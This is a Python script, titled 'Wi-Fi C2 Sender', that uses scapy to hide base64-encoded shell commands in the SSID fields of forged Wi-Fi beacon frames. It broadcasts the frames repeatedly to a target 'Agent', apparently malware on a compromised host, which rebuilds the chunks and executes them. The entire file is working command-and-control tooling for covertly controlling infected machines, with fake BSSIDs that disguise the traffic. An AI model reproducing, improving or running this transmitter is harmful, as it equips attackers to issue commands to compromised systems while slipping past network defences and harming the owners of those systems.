#!/usr/bin/env python3
import time
import math
import base64
import struct
import os
import random
import string
import sys
from scapy.all import *

# --- DEFAULTS ---
INTERFACE = "wlan0mon" 
TAG = "RX"

def get_job_id():
    return ''.join(random.choices('0123456789ABCDEF', k=4))

def craft_frames(full_command, target_id, job_id, channel):
    frames = []
    
    encoded_bytes = base64.b64encode(full_command.encode('utf-8'))
    encoded_cmd = encoded_bytes.decode('utf-8')

    # Keep chunk size small (10) to avoid SSID overflow
    chunk_size = 10 
    total_chunks = math.ceil(len(encoded_cmd) / chunk_size)

    for i in range(total_chunks):
        start = i * chunk_size
        end = start + chunk_size
        chunk = encoded_cmd[start:end]
        
        index = i + 1
        # RX:AGT01:JOBID:1/9:DATA
        payload = f"{TAG}:{target_id}:{job_id}:{index}/{total_chunks}:{chunk}"
        
        # Safety Check
        if len(payload) > 32:
            print(f"[!] ERROR: Payload too long ({len(payload)}). Reduce ID or Chunk Size.")
            sys.exit(1)
        
        # Unique BSSID per fragment
        unique_mac = f"00:11:22:33:44:{index:02x}"
        
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', 
                      addr2=unique_mac, addr3=unique_mac)
        
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=payload, len=len(payload))
        rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        channel_ie = Dot11Elt(ID='DSset', info=struct.pack("B", int(channel)))
        
        frames.append(RadioTap()/dot11/beacon/essid/rates/channel_ie)
        
    return frames

def transmit(target_id, channel):
    print(f"[*] Setting Interface {INTERFACE} to Channel {channel}...")
    os.system(f"iwconfig {INTERFACE} channel {channel}")
    
    while True:
        cmd = input(f"\n[Target: {target_id}] Enter command (or 'exit', 'change'): ")
        
        if cmd == 'exit': sys.exit()
        if cmd == 'change': return

        job_id = get_job_id()
        frames = craft_frames(cmd, target_id, job_id, channel)
        
        print(f"[*] Job: {job_id} | Frames: {len(frames)}")
        print(f"[*] Broadcasting INDEFINITELY. Press Ctrl+C when Agent executes.")
        
        try:
            while True:
                for frame in frames:
                    # Send heavily to ensure signal integrity
                    sendp(frame, iface=INTERFACE, verbose=0, count=20)
                    time.sleep(0.01)
                time.sleep(0.05)
                
        except KeyboardInterrupt:
            print("\n[!] Stopping Broadcast. Ready for next command.")

if __name__ == "__main__":
    print("--- Wi-Fi C2 Sender (Infinite Mode) ---")
    while True:
        target = input("Set Target Agent ID (Max 5 chars): ")
        chan = input("Set Wi-Fi Channel (1-11): ")
        transmit(target, chan)